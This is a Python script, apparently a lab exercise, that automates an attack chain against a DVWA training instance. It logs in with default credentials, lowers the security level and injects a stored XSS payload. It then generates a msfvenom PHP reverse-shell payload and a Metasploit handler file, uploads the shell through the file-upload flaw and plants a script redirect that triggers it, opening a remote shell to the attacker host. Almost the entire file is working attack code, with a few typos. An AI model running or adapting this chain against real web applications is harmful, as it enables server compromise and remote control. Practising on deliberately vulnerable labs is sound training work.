#!/usr/bin/env /usr/bin/python3

# (1) Login action
# (2) Security Level is set to low
# (3) Command execution -> vulnerabilities
# (4) Attack Code

import sys
import re
import os
import time
import requests
from bs4 import BeautifulSoup

# (0) Ready
proxies = {'http':'http://localhost:9000', 'https':'http://localhost:9000'}

# (1) Login action
# URL   : http://192.168.10.134/dvwa/login.php
# DATA  : username=admin&password=password&Login=Login
# OK    : Welcome to Damn Vulnerable Web App!
# FAIL  : Login failed
s = requests.Session()
login_url = 'http://192.168.10.134/dvwa/login.php'
login_data = {'username':'admin', 'password':'password', 'Login':'Login'}
#req = requests.Request("POST", login_url, data=login_data)
#prepare = s.prepare_request(req)
#resp = s.send(prepare, proxies=proxies)
resp = s.post(login_url, data=login_data, proxies=proxies)
#print(resp)

soup = BeautifulSoup(resp.text, 'lxml')
MESS1 = 'Welcome to Damn Vulnerable Web App!'
if re.search(MESS1, soup.div.h1.string):
    print("[  OK  ] Login successfully.")
else:
    print("[ FAIL ] Login successfully.")
    sys.exit(2)

# (2) Security Level is set to low
# URL       : http://192.168.10.134/dvwa/security.php
# DATA      : security=low&seclev_submit=Submit
# MESS_OK   : Security level set to low
security_url = 'http://192.168.10.134/dvwa/security.php'
security_data = {'security':'low', 'seclev_submit':'Submit'}
#resp = s.post(security_url, data=security_data, proxies=proxies)
req = requests.Request('POST', security_url, data=security_data)
prepare = s.prepare_request(req)
resp = s.send(prepare, proxies=proxies)
#print(resp)
soup = BeautifulSoup(resp.text, 'lxml')
MESS2 = 'Security level set to low'
if re.search(MESS2, str(soup.find_all('div', class_='message'))):
    print("[  OK  ] Security Level is low")
else:
    print("[ FAIL ] Security level is not set to low.")
    sys.exit(3)

# (3) Command execution -> vulnerabilities
# URL       : http://192.168.10.134/dvwa/vulnerabilities/xss_s/
# DATA      : txtName=test2&mtxMessage=%3Cscript%3Ealert%28%22Hacked%22%29%3C%2Fscript%3E&btnSign=Sign+Guestbook
# MESS_OK   : Hacked
#xss_script = '%3Cscript%3Ealert%28%22Hacked%22%29%3C%2Fscript%3E'
xss_script = '<script>alert("Hacked")</script>'
xss_url = 'http://192.168.10.134/dvwa/vulnerabilities/xss_s/'
xss_data = { 'txtName':'test2', 'mtxMessage':xss_script, 'btnSign':'Sign+Guestbook'}
resp = s.post(xss_url, data=xss_data, proxies=proxies)
#print(resp)

soup = BeautifulSoup(resp.text, 'lxml')
MESS3 = 'Hacked'
#print(soup.find_all('div', attrs=id))
if re.search(MESS3, str(soup.find_all('script'))):
    print("[  OK  ] XSS attack is possible.")
else:
    print("[ FAIL ] XSS attack is not pssible.")
    sys.exit(4)

# (4) Attack Code
# [TERM1] # msfvenom -p php/reverse_php LHOST=192.168.10.60 LPORT=4444 -f raw > attack.php
# [TERM1] # cat << EOF >> reverse_connection.rc
# use exploit/multi/handler
# set payload php/reverse_php
# set LHOST 192.168.10.60
# set LPORT 4444
# set ExitSession false
# exploit -j -z
# EOF
# [TERM1] # msfconsole -r reverse_connection.rc
# [TERM2] # python3 XSS.py
# (1) attack.php -- file uplad --> DVWA
# (2) <script>windw.location=...</script> --> DVWA XSS stored


# (4-1) attack.php file creation.
try:
    print("[ INFO ] Pleas wait a few minute.")
    os.system("msfvenom -p php/reverse_php LHOT=192.168.10.50 LPORT=4444 -f raw > attack.php")
    print("[  OK  ] attack.php file created.")
except:
    print("[ FAIL ] attack.php file not create.")

# (4-2) reverse_connection.rc file creation.
resource_content ="""
use exploit/multi/handler
set payload php/reverse_php
set LHOST 192.168.10.50
set LPORT 4444
set ExitSession false
exploit -j -z
"""
with open('reverse_connection.rc', 'w+') as fd:
    fd.write(resource_content)
    print("[  OK  ] reverse_connection.rc file created.")

# (4-4) attack.php file uploading
# DATA  : Content-Disposition: form-data; name="MAX_FILE_SIZE" 100000
#         Content - Disposition: form - data; name = "Upload" Upload
upload_url = 'http://192.168.10.134/dvwa/vulnerabilities/upload/'
upload_data = {"MAX_FILE_SIZE":'100000', "Upload" :'Upload'}
upload_files = {'uploaded' : ('attack.php', open('attack.php', 'rb'), 'text/pain')}
resp = s.post(upload_url, data=upload_data, files=upload_files, proxies=proxies)
#print(resp)

soup = BeautifulSoup(resp.text, 'lxml')
MESS4 = 'succesfully uploaded'
if re.search(MESS4, soup.div.pre.string):
    print("[  OK  ] attack.php file uploaded.")
else:
    print("[ FAIL ] attack.php file upload.")

# (4-3) mfsconsole -r <rc file>
try:
    os.system("xterm -e msfconsole -r reverse_connection.rc &")
    print("[ INFO ] Pleas wait a few minute")
    print("[  OK  ] mfsconsole -r <resource file>")
    time.sleep(22)
except:
    print("[ FAIL ] msfconsole - r <resource file>")

# (4-5) Posting on the board
# URL   : http://192.168.10.134/dvwa/vulnerabilities/xss_s/
# DATA  : txtName=test3&mtxMessage=%3Cscript%3Ewindow.location%3D%22http%3A%2F%2F192.168.10.134%2Fdvwa%2Fhackable%2Fuploads%2Fattack.php+%22%3C%2Fscript%3E%0D%0A&btnSign=Sign+Guestbook
xss_url2 = 'http://192.168.10.134/dvwa/hackable/uploads/attack.php'
xss_script2 = '<script>window.location="http://192.168.10.134/dvwa/hackable/uploads/attack.php"</script>'
xss_data2 = { 'txtName':'test3', 'mtxMessage':xss_script2, 'btnSign':'Sign+Guestbook'}
resp = s.post(xss_url, data=xss_data2, proxies=proxies)

soup = BeautifulSoup(resp.text, 'lxml')
#print(soup.find_all('script'))
#soup2 = BeautifulSoup(resp2.text, 'lxml')
#print(soup2)
MESS5 = '192.168.10.134/dvwa/hackable/uploads/attack.php'
find_str = soup.find_all('script')
if re.search(MESS5, str(find_str)):
    resp2 = s.get(xss_url2, proxies=proxies)
    print("[  OK  ] attack.php file executed.")
else:
    print("[ FAIL ] attack.php file execute.")